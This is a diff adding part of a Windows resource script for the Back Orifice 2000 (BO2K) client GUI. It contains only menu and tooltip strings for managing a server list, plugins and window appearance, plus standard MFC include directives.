+    AFX_IDS_SCTASKLIST      "Activate Task List"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    IDM_SERVERLIST          "Show or hide the server list\nToggle Server List"
+    IDP_PINGSERVER          "Ping ser"
+    ID_REQUERYSERVER        "Re-query server capabilities"
+    ID_PINGSERVER           "Ping Back Orifice Server"
+    IDP_DELETESERVER        "Remove server from server list"
+    ID_ACTIVATESERVER       "Open the server dialog for this machine"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    ID_INSERTMACHINE        "Insert a machine"
+    IDP_ADDMACHINE          "Add a server to the server list"
+    IDM_PLUGINS             "Configure BO2K client plugins\nClient plugins setup"
+    IDM_GRADIENTS           "View windows in color gradients\nActivate color gradients"
+    IDM_MENUTYPE            "Screen reader compatible menu bar."
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    IDS_HIDE                "Hide docked window"
+    IDS_EXPAND              "Expand docked window"
+    IDS_CONTRACT            "Contract docked window"
+    IDC_TABCTRLBAR          "Tabbed Window"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    IDM_SOLIDCOLOR          "Set solid color background"
+    IDM_BITMAP              "Set wallpaper bitmap"
+    IDM_TILE                "Tile the background image"
+    ID_FILE_NEWSERVER       "Create a new server"
+END
+
+STRINGTABLE DISCARDABLE 
+BEGIN
+    ID_SERVER_NEW           "Create a new server."
+    ID_SERVER_EDIT          "Edit a currently existing server."
+    ID_SERVER_DELETE        "Delete selected server(s)"
+END
+
+#endif    // English (U.S.) resources
+/////////////////////////////////////////////////////////////////////////////
+
+
+
+#ifndef APSTUDIO_INVOKED
+/////////////////////////////////////////////////////////////////////////////
+//
+// Generated from the TEXTINCLUDE 3 resource.
+//
+#define _AFX_NO_SPLITTER_RESOURCES
+#define _AFX_NO_OLE_RESOURCES
+#define _AFX_NO_TRACKER_RESOURCES
+#define _AFX_NO_PROPERTY_RESOURCES
+
+#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
+#ifdef _WIN32
+LANGUAGE 9, 1
+#pragma code_page(1252)
+#endif //_WIN32
+#include "res\bo2kgui.rc2"  // non-Microsoft Visual C++ edited resources
+#include "afxres.rc"         // Standard components
+#endif
+
+/////////////////////////////////////////////////////////////////////////////
+#endif    // not APSTUDIO_INVOKED
+
